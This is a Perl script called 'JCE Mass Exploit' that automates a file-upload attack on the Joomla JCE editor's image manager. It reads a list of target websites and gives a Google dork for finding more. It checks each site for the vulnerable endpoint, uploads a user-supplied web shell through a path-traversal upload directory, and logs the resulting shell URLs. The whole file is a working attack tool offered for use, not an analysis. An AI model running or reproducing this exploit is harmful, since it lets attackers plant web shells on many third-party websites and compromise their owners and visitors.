#!/usr/bin/perl

# JCE Mass Exploit
# Sheikh Nightshader
use Term::ANSIColor;
use if $^O eq "MSWin32", Win32::Console::ANSI;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use File::Basename;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

print color('bold green');
print("
####################################################
#               Sheikh  Nightshader                #
#                                                  #
#        Upload Files to Vulnerable Websites       #
#                                                  #
#             JCE file upload exploit              #
####################################################
");

print color('bold white');
print(" Google Dork: inurl:”/index.php?option=com_jce”
");

print colored (" [website list]: ",'bold green');
my $list=<STDIN>;
chomp($list);
open (THETARGET, "<$list") || die ">>>Can't open the Website list<<< !";
@TARGETS = <THETARGET>;
close THETARGET;

print colored (" [shell file path]: ",'bold green');
my $shell_file = <STDIN>;
chomp($shell_file);
my $filename = basename($shell_file);

foreach my $site (@TARGETS) {
    chomp $site;
    if($site !~ /http:\/\//) { $site = "http://$site/"; }
    my $exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

    print colored ("\n [EXPLOIT LOAD] $site\n",'bold green'); sleep(1);

    my $vulnurl = $site.$exploiturl;
    my $res = $ua->get($vulnurl)->content;

    if ($res =~ m/No function call specified!/i) {
        print colored (" [UPLOAD]",'bold green'),"\n";
        my $res = $ua->post($vulnurl,
            Content_Type => 'form-data',
            Content => [
                'upload-dir' => './../../',
                'upload-overwrite' => 0,
                'Filedata' => [$shell_file],
                'action' => 'upload'
            ]
        )->decoded_content;

        print colored (" [File Successfully] $site/$filename\n",'white'); sleep(1);
    } else {
        print colored (" [EXPLOIT FAIL]",'bold red'),"\n"; sleep(1);
    }

    open(save, '>>list.txt');
    print save "$site/$filename\n";
    close(save);
}
